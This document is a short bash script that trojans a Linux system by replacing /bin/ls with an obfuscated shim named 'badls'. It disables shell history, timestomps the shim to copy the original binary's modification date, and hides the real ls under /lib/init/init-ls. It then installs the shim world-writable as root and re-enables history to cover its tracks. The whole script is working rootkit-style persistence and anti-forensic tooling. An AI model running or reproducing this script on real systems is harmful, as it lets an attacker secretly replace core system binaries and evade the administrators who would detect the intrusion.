# !/bin/bash
: <<'END'
A simple script that replaces the original ls binary with a shim


END

# Make sure only root can run our script
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

echo "[*] Disabling Bash history"
# disable bash history
set +o history

LS=/bin/ls
SHIM=./badls_obfuscated
BK=/lib/init/init-ls

echo "[*] replacing $SHIM last modifcation date to $LS"
# change shim modification date to ls last modification date
touch -r $LS $SHIM

echo "[*] Moving things around .."
# move ls binary
mv -fi $LS $BK

# replace it with my shim
cp -fi $SHIM $LS

echo "[*] setting permissions.."
# Set root as the owner
chown root:root $LS
chmod 777 $LS

echo "[*] re-enabling Bash history"
# enable bash history
set -o history

echo "[!] Done"
